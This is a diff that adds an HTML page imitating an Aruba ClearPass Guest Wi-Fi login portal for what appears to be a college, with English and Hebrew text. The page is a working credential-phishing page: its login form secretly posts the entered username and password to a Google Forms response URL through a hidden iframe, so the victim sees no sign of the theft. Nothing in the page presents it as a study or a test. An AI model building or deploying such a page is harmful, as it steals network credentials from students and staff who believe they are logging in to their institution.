@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="he">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Varela+Round&display=swap" rel="stylesheet">
+    <title>ClearPass Guest Login</title>
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+
+        /* --- Top Logo Bar --- */
+        .header-logos {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px 20px;
+            background: linear-gradient(to bottom, #ffffff 0%, #f2f2f2 100%);
+            border-bottom: 1px solid #cccccc;
+            height: 40px;
+            position: relative;
+        }
+
+        .aruba-logo {
+            color: #ff8300;
+            font-weight: bold;
+            font-size: 24px;
+            font-family: 'Varela Round', sans-serif;
+            letter-spacing: -1px;
+            position: absolute;
+            left: 20px;
+        }
+
+        .clearpass-logo {
+            color: #555;
+            font-size: 18px;
+            font-weight: bold;
+            font-family: Arial, sans-serif;
+        }
+
+        .clearpass-logo span {
+            color: #0077a9;
+        }
+
+        /* --- Main Content Indentation --- */
+        .main-content-indent {
+            margin-left: 15px;
+            padding-top: 20px;
+        }
+
+        .instruction-text {
+            font-style: italic;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        /* --- Login Box Styles --- */
+        .login-box-wrapper {
+            width: 350px;
+            border: 1px solid #8ba0b9;
+            border-radius: 4px;
+            overflow: hidden;
+            background-color: #fff;
+            box-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-header {
+            background: linear-gradient(to bottom, #265888 0%, #15385e 100%);
+            color: white;
+            padding: 6px 10px;
+            font-weight: bold;
+            font-size: 13px;
+            border-bottom: 1px solid #0d2c4d;
+            text-shadow: 1px 1px 0px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+
+        .login-content {
+            padding: 15px;
+            background: #fdfdfd;
+        }
+
+        /* Button Area - UPDATED */
+        .button-area {
+            padding: 8px 15px;
+            /* Grey gradient to match the original image */
+            background: linear-gradient(to bottom, #cbdbeb 0%, #d4d4d4 100%);
+            border-top: 1px solid #c0c0c0;
+            /* Centers the button */
+            text-align: center;
+        }
+
+        /* --- Form Elements --- */
+        label {
+            display: block;
+            font-size: 11px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 3px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 4px;
+            margin-bottom: 12px;
+            border: 1px solid #7f9db9;
+            border-radius: 2px;
+            box-sizing: border-box;
+            font-size: 13px;
+        }
+
+        button {
+            padding: 3px 20px;
+            /* Increased side padding slightly */
+            font-size: 13px;
+            cursor: pointer;
+            background: linear-gradient(to bottom, #f5f5f5 0%, #dcdcdc 100%);
+            border: 1px solid #999;
+            border-radius: 3px;
+            color: #333;
+            font-weight: normal;
+        }
+
+        button:hover {
+            border-color: #666;
+        }
+
+        /* --- Footer/Outside Elements --- */
+        .checkbox-container {
+            margin-top: 8px;
+            font-size: 11px;
+            color: #666;
+            width: 350px;
+        }
+
+        .footer-links {
+            margin-top: 5px;
+            font-size: 12px;
+            line-height: 1.5;
+            color: #666;
+        }
+
+        .footer-links a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
+    <div class="header-logos">
+        <div class="aruba-logo">aruba</div>
+        <div class="clearpass-logo">ClearPass <span>Guest</span></div>
+    </div>
+
+    <div class="main-content-indent">
+
+        <div class="instruction-text">
+            Please login to the network using your username and password.<br>
+            אנא התחבר לרשת באמצעות שם המשתמש והסיסמה שלך
+        </div>
+
+        <form class="login-box-wrapper" action="https://docs.google.com/forms/d/e/1FAIpQLSdTxgCiPOwzJHz2f7QSgVaKAMLFCmcfln3q2zyLKCcWZmzabA/formResponse" method="POST" target="hidden_iframe">
+
+            <div class="login-header">Students and Employees Wi-Fi Access</div>
+
+            <div class="login-content">
+                <label>Username \ שם משתמש</label>
+                <input type="text" name="entry.971008255" required>
+
+                <label>Password \ סיסמא</label>
+                <input type="password" name="entry.2109314742" id="passwordInput" required>
+            </div>
+
+            <div class="button-area">
+                <button type="submit">Log In</button>
+            </div>
+        </form>
+
+        <div class="checkbox-container">
+            <input type="checkbox" id="showPass" style="vertical-align: middle; margin: 0 0 0 0;">
+            <label for="showPass" style="display: inline; font-weight: normal; color: gray;">Show Password</label>
+        </div>
+
+        <div class="footer-links">
+            Contact <a href="mailto:support@jct.ac.il">support@jct.ac.il</a> if you are experiencing difficulty logging in.<br>
+            <a href="#">For Guest Access click here - לכניסת אורחים לחץ כאן</a>
+        </div>
+
+    </div>
+
+    <script>
+        document.getElementById('showPass').addEventListener('change', function() {
+            var passwordField = document.getElementById('passwordInput');
+            if (this.checked) {
+                passwordField.type = 'text';
+            } else {
+                passwordField.type = 'password';
+            }
+        });
+    </script>
+
+</body>
+
+</html>
